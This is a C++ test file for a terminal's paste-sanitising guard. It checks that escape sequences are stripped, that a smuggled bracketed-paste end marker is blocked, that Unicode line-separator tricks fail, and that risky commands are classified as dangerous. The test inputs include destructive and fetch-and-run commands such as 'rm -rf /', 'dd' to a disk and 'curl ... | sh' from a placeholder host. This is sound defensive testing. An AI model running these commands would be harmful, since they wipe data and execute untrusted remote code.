// T28 — the paste guard. rules/net.md: remote input is hostile, and the
// clipboard IS remote input. A web page chooses what lands on it, so every case
// below is an attack someone has actually shipped, not a hypothetical.

#include "app/input/paste.h"
#include <catch2/catch_test_macros.hpp>

using krait::app::input::PasteRisk;
using krait::app::input::preparePaste;

TEST_CASE("a plain one-line paste is sent unchanged and needs no confirming", "[input][paste]") {
    const auto result = preparePaste("ls -la", false);
    CHECK(result.bytes == "ls -la");
    CHECK(result.risk == PasteRisk::None);
    CHECK_FALSE(result.needsConfirm());
    CHECK_FALSE(result.sanitised);
}

TEST_CASE("escape is stripped from a paste", "[input][paste]") {
    // The whole attack: put text on the clipboard whose payload is an escape
    // sequence. A pasted ESC can set modes, retitle the window, or trigger a
    // report the terminal then sends back as though it were typed.
    const auto result = preparePaste(QString::fromUtf8("safe\x1B]0;pwned\x07text"), false);
    CHECK_FALSE(result.bytes.contains('\x1B'));
    CHECK_FALSE(result.bytes.contains('\x07'));
    CHECK(result.bytes == "safe]0;pwnedtext");
    CHECK(result.sanitised);
}

TEST_CASE("every C0 control is dropped except tab", "[input][paste]") {
    const auto result = preparePaste(QString::fromUtf8("a\x01\x02\x1F\x7F"
                                                       "b\tc"),
                                     false);
    CHECK(result.bytes == "ab\tc");
    CHECK(result.sanitised);
}

TEST_CASE("the bracketed-paste end marker cannot be smuggled in", "[input][paste]") {
    // Without this, clipboard text containing the END marker closes the bracket
    // early and everything after it arrives as though the user typed it — the
    // exact thing bracketed paste exists to prevent.
    const auto result = preparePaste(QString::fromUtf8("harmless\x1B[201~rm -rf /"), true);
    REQUIRE(result.bytes.startsWith("\x1B[200~"));
    REQUIRE(result.bytes.endsWith("\x1B[201~"));
    // Exactly one END marker: the closing one we added.
    CHECK(result.bytes.count("[201~") == 1);
}

TEST_CASE("bracketed paste wraps, and plain paste does not", "[input][paste]") {
    CHECK(preparePaste("echo hi", true).bytes == "\x1B[200~echo hi\x1B[201~");
    CHECK(preparePaste("echo hi", false).bytes == "echo hi");
}

TEST_CASE("newlines become CR, and CRLF does not double up", "[input][paste]") {
    // A CRLF paste that sent both endings would give the shell a blank command
    // between every pair of real ones.
    CHECK(preparePaste("one\r\ntwo", false).bytes == "one\rtwo");
    CHECK(preparePaste("one\ntwo", false).bytes == "one\rtwo");
    CHECK(preparePaste("one\rtwo", false).bytes == "one\rtwo");
}

TEST_CASE("a multiline paste asks for confirmation", "[input][paste]") {
    const auto result = preparePaste("echo one\necho two", false);
    CHECK(result.risk == PasteRisk::Multiline);
    CHECK(result.needsConfirm());
}

TEST_CASE("a trailing newline is called out separately", "[input][paste]") {
    // One line plus Enter is not "multiline", but it still runs with no further
    // keypress, so the user loses the chance to read it. Different warning.
    const auto result = preparePaste("echo one\n", false);
    CHECK(result.risk == PasteRisk::ExecutesOnPaste);
}

TEST_CASE("dangerous commands outrank the shape of the paste", "[input][paste]") {
    // Saying "this is multiline" about a sudo paste points the user at the
    // wrong thing to check, so severity is ordered, not accumulated.
    CHECK(preparePaste("sudo rm -rf /\necho done", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("sudo apt install foo", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("rm -rf ~/work", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("rm -fr ~/work", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("dd if=/dev/zero of=/dev/sda", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("mkfs.ext4 /dev/sdb1", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("chmod 777 /etc", false).risk == PasteRisk::DangerousCommand);
    CHECK(preparePaste("curl https://x.example/i.sh | sh", false).risk ==
          PasteRisk::DangerousCommand);
    CHECK(preparePaste("wget -qO- https://x.example/i.sh | sudo bash", false).risk ==
          PasteRisk::DangerousCommand);
    CHECK(preparePaste("format c:", false).risk == PasteRisk::DangerousCommand);
}

TEST_CASE("the dangerous list does not fire on innocent text", "[input][paste]") {
    // A guard that cries wolf is a guard people click through, so the false
    // positives matter as much as the catches.
    CHECK(preparePaste("sudoku solver", false).risk == PasteRisk::None);
    CHECK(preparePaste("python format.py", false).risk == PasteRisk::None);
    CHECK(preparePaste("git rm file.txt", false).risk == PasteRisk::None);
    CHECK(preparePaste("rmdir empty", false).risk == PasteRisk::None);
    CHECK(preparePaste("curl https://x.example/data.json", false).risk == PasteRisk::None);
    CHECK(preparePaste("echo pseudo-random", false).risk == PasteRisk::None);
}

TEST_CASE("UTF-8 survives the guard intact", "[input][paste]") {
    // Thai ships as a first-class locale; a sanitiser walking bytes rather than
    // characters would shred it.
    const QString thai = QString::fromUtf8("echo สวัสดี");
    const auto result = preparePaste(thai, false);
    CHECK(result.bytes == thai.toUtf8());
    CHECK_FALSE(result.sanitised);
}

TEST_CASE("Unicode line breaks cannot smuggle a second command past the guard", "[input][paste]") {
    // The bypass: join two commands with U+2028 and the classifier sees ONE
    // line, so a dangerous second half rides through as harmless. NEL and
    // PARAGRAPH SEPARATOR are the same trick.
    for (const char16_t separator : {char16_t{0x0085}, char16_t{0x2028}, char16_t{0x2029}}) {
        const QString payload =
            QStringLiteral("echo hi") + QChar(separator) + QStringLiteral("echo there");
        INFO("separator U+" << QString::number(separator, 16).toStdString());
        const auto result = preparePaste(payload, false);
        CHECK(result.risk == PasteRisk::Multiline);
        CHECK(result.bytes == "echo hi\recho there");
    }
    // ...and the dangerous half is still seen for what it is.
    const QString sneaky = QStringLiteral("echo hi") + QChar(char16_t{0x2028}) +
                           QStringLiteral("sudo apt install pwned");
    CHECK(preparePaste(sneaky, false).risk == PasteRisk::DangerousCommand);
}

TEST_CASE("C1 controls are stripped from a paste", "[input][paste]") {
    // U+009B IS CSI to a parser that honours 8-bit C1. Ours does not under
    // UTF-8, but pasted text has no legitimate C1 in it and this is the
    // cheapest possible defence in depth.
    const QString payload = QStringLiteral("safe") + QChar(char16_t{0x009B}) +
                            QStringLiteral("31m") + QChar(char16_t{0x0090}) + QStringLiteral("x");
    const auto result = preparePaste(payload, false);
    CHECK(result.bytes == "safe31mx");
    CHECK(result.sanitised);
}
